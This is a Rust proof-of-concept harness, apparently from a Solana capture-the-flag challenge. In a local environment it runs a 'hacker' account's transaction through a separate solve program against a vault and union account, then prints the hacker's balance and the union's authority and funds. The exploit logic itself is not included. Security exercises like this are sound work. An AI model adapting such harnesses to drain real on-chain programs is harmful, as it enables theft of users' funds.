use borsh::BorshSerialize;
use poc_framework_osec::{Environment, LocalEnvironment, PrintableTransaction};
use rand::prelude::*;
use solana_sdk::{
    account::ReadableAccount, instruction::AccountMeta, instruction::Instruction, pubkey::Pubkey,
    signature::Signer, signer::keypair::Keypair, system_program,
};

#[derive(Debug, Clone, BorshSerialize, PartialEq, Eq, PartialOrd, Ord)]
pub enum SailorInstruction {
    CreateUnion(u64),
    PayDues(u64),
    StrikePay(u64),
    RegisterMember([u8; 32]),
}

fn main() {
    let mut rng = StdRng::from_seed([42; 32]);

    let prog = Keypair::generate(&mut rng);
    let sol = Keypair::generate(&mut rng);
    let rich_boi = Keypair::generate(&mut rng);
    let hacker = Keypair::generate(&mut rng);

    let (vault, _) = Pubkey::find_program_address(&[b"vault"], &prog.pubkey());
    let (sailor_union, _) =
        Pubkey::find_program_address(&[b"union", rich_boi.pubkey().as_ref()], &prog.pubkey());
    let (registration, _) = Pubkey::find_program_address(
        &[
            b"registration",
            rich_boi.pubkey().as_ref(),
            hacker.pubkey().as_ref(),
        ],
        &prog.pubkey(),
    );

    let mut env = LocalEnvironment::builder()
        .add_program(prog.pubkey(), "sailors_revenge.so")
        .add_program(sol.pubkey(), "solve.so")
        .add_account_with_lamports(vault, system_program::id(), 1_000_000)
        .add_account_with_lamports(rich_boi.pubkey(), system_program::id(), 1_000_000_000_000)
        .add_account_with_lamports(hacker.pubkey(), system_program::id(), 1337)
        .build();

    env.execute_as_transaction(
        &[Instruction::new_with_borsh(
            prog.pubkey(),
            &SailorInstruction::CreateUnion(500_000_000),
            vec![
                AccountMeta::new(sailor_union, false),
                AccountMeta::new(rich_boi.pubkey(), true),
                AccountMeta::new(vault, false),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
        )],
        &[&rich_boi],
    )
    .print_named("init");

    env.execute_as_transaction(
        &[Instruction::new_with_borsh(
            prog.pubkey(),
            &SailorInstruction::RegisterMember(hacker.pubkey().to_bytes()),
            vec![
                AccountMeta::new(registration, false),
                AccountMeta::new_readonly(sailor_union, false),
                AccountMeta::new(rich_boi.pubkey(), true),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
        )],
        &[&rich_boi],
    )
    .print_named("init2");

    env.execute_as_transaction(
        &[Instruction::new_with_bytes(
            sol.pubkey(),
            &[],
            vec![
                AccountMeta::new_readonly(prog.pubkey(), false),
                AccountMeta::new(hacker.pubkey(), true),
                AccountMeta::new(vault, false),
                AccountMeta::new(sailor_union, false),
                AccountMeta::new(registration, false),
                AccountMeta::new_readonly(rich_boi.pubkey(), false),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
        )],
        &[&hacker],
    )
    .print_named("lmao");

    println!(
        "hacker ended with {} :o",
        env.get_account(hacker.pubkey()).unwrap().lamports()
    );
    println!(
        "union authority {} :o",
        Pubkey::new_from_array(
            env.get_account(sailor_union.clone()).unwrap().data()[8..40]
                .try_into()
                .unwrap()
        )
    );
    println!(
        "union funds {} :o",
        u64::from_le_bytes(
            env.get_account(sailor_union.clone()).unwrap().data()[0..8]
                .try_into()
                .unwrap()
        )
    );
}
